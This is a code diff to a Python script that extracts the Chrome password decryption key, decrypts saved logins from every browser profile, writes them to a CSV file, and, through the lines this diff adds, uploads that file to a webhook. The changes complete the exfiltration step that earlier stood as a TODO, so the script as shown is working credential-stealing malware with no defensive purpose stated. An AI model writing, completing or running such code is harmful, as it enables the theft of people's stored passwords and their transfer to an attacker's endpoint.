@@ -8,14 +8,18 @@ from Crypto.Cipher import AES
 from shutil import copyfile
 import csv
 
-url = ""
-# I used reference to figure out the decryption.
-# Possibly create user account path constant
-# TODO: Send to webhook
+webhookURL = ""
+CHROMEPATH = f"c:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data"
 
-def sendToWebhook(data):
-    # Create webhook info stuff here then pass as json
-    requests.post(url, data=data)
+# I used reference to figure out the decryption.
+
+def sendToWebhook(fileToSend):
+    file = open(fileToSend, "rb")
+    # "content": "file",
+    data = {
+        "file": (file.name, file.read())
+    }
+    requests.post(webhookURL, data=data)
 
 def getChromePasswordDencryptionKey(path):
     if not os.path.exists(f"{path}\\Local State"): return
@@ -36,15 +40,14 @@ def decryptPassword(password, key):
             return None
 
 def getChromePasswords():
-    path = f"c:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data"
-    decryptionKey = getChromePasswordDencryptionKey(path)
+    decryptionKey = getChromePasswordDencryptionKey(CHROMEPATH)
     exportedPasswordsFile = open("CDBEXP.csv", "w", newline="")
     csvWriter = csv.writer(exportedPasswordsFile)
     i = 0
     i2 = 1
 
-    for itemName in os.listdir(path):
-        fullFilePath = f"{path}\\{itemName}"
+    for itemName in os.listdir(CHROMEPATH):
+        fullFilePath = f"{CHROMEPATH}\\{itemName}"
         if os.path.isdir(fullFilePath) and "profile" in itemName.lower() or "default" in itemName.lower():
             loginDataFile = f"{fullFilePath}\\Login Data"
             if os.path.exists(loginDataFile) and os.path.isfile(loginDataFile):
@@ -69,6 +72,6 @@ def getChromePasswords():
                 passwordsDB.close()
                 os.remove(os.path.abspath(copiedLoginDataFile))
     exportedPasswordsFile.close()
-    return ""
+    return exportedPasswordsFile.name
 
-print(getChromePasswords())
+sendToWebhook(getChromePasswords())
